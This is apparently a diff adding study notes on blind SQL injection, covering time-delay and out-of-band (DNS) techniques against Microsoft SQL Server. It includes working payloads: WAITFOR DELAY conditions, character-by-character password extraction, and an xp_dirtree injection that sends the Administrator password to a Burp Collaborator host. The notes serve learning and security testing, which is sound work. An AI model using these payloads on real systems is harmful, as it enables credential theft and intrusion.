@@ -229,19 +229,103 @@ This type of query may also be useful if a character limit prevents you from tri
 
 6.3 Exploiting blind SQLi by triggering time delays
 
+In case, the app is not reflecting any message like "Welcome back", and you are not able to induce error, then this technique can be used.
+
+If the application catches database errors when the SQL query is executed and handles them gracefully, there won't be any difference in the application's response. 
+This means the previous technique for inducing conditional errors will not work. 
+
+In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering time delays depending on whether an injected condition is true or false. 
+As SQL queries are normally processed synchronously by the application, delaying the execution of a SQL query also delays the HTTP response. 
+This allows you to determine the truth of the injected condition based on the time taken to receive the HTTP response. 
+
+{
+Synchronous Processing
+
+    Waits for Completion: The application pauses until the database finishes the SQL query and returns results.
+    Delays HTTP Response: Query delays (e.g., SLEEP(5)) directly slow down the HTTP response, revealing true/false conditions.
+    Common in Web Apps: Most web apps (e.g., PHP, Java) use synchronous queries for simplicity and data consistency.
+
+Asynchronous Processing
+
+    Non-Blocking: The application sends the query and continues other tasks, handling results later via callbacks.
+    No HTTP Delay: Query delays don’t affect HTTP response time, making time-based blind SQL injection ineffective.
+}
+
+The techniques for triggering a time delay are specific to the type of database being used. 
+For example, on Microsoft SQL Server, you can use the following to test a condition and trigger a delay depending on whether the expression is true:
+
+'; IF (1=2) WAITFOR DELAY '0:0:10'--
+'; IF (1=1) WAITFOR DELAY '0:0:10'--
+
+    The first of these inputs does not trigger a delay, because the condition 1=2 is false.
+    The second input triggers a delay of 10 seconds, because the condition 1=1 is true.
 
 
+Using this technique, we can retrieve data by testing one character at a time: 
+
+'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
+
+[This SQL query counts the number of rows in the Users table where the Username is 'Administrator'. It returns a single value representing that count, typically 1 if the user exists, or 0 if not.]
 
 
+6.4 Exploiting blind SQLi using out-of-band (OAST) techniques
+[OAST = Out-of-Band Application Security Testing]
 
+An application might carry out the same SQL query as the previous example but do it asynchronously.
 
+Meaning:
+The application sends the SQL query to the database in a separate thread and continues processing the user's request without waiting for the query to complete, 
+so the WAITFOR DELAY does not affect the main thread's HTTP response time.
+The application's HTTP response is sent before the query (and its delay) finishes, meaning the response time or content doesn’t reflect whether the condition 
+(e.g., SUBSTRING(Password, 1, 1) > 'm') is true or false.
 
+The application's response doesn't depend on the query returning any data, a database error occurring, or on the time taken to execute the query. 
 
+In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering out-of-band network interactions to a system that you control. 
+These can be triggered based on an injected condition to infer information one piece at a time. 
+More usefully, data can be exfiltrated directly within the network interaction.
 
+A variety of network protocols can be used for this purpose, but typically the most effective is DNS (domain name service). 
+Many production networks allow free egress of DNS queries, because they're essential for the normal operation of production systems. 
 
+{
+What is Free Egress of DNS Queries and Why is DNS Preferred?
 
+Free Egress of DNS Queries: This means production networks often allow DNS queries to exit the network without strict filtering, as they are critical for 
+resolving domain names to IP addresses for normal system operations.
 
+DNS Preferred - Common Allowance: DNS traffic is rarely blocked or heavily monitored in most networks, making it a reliable channel for 
+out-of-band SQL injection to send data to an attacker-controlled server via DNS lookups.
 
+DNS Preferred - Data Exfiltration: DNS allows attackers to encode/embed data (e.g., password characters) in subdomain queries 
+(like password_a.attacker.com), which are logged on the attacker’s DNS server, enabling effective data extraction even in blind SQL injection scenarios.
+}
 
+The easiest and most reliable tool for using out-of-band techniques is Burp Collaborator. 
+This is a server that provides custom implementations of various network services, including DNS. 
+It allows you to detect when network interactions occur as a result of sending individual payloads to a vulnerable application
 
+The techniques for triggering a DNS query are specific to the type of database being used. 
+For example, the following input on Microsoft SQL Server can be used to cause a DNS lookup on a specified domain: 
 
+'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
+
+This causes the database to perform a lookup for the following domain:
+
+0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
+
+Having confirmed a way to trigger out-of-band interactions, you can then use the out-of-band channel to exfiltrate data from the vulnerable application. 
+For example: 
+
+'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
+
+This input reads the password for the Administrator user, appends a unique Collaborator subdomain, and triggers a DNS lookup. 
+This lookup allows you to view the captured password: 
+
+S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
+
+Out-of-band (OAST) techniques are a powerful way to detect and exploit blind SQL injection, 
+due to the high chance of success and the ability to directly exfiltrate data within the out-of-band channel. 
+For this reason, OAST techniques are often preferable even in situations where other techniques for blind exploitation do work. 
+
+-
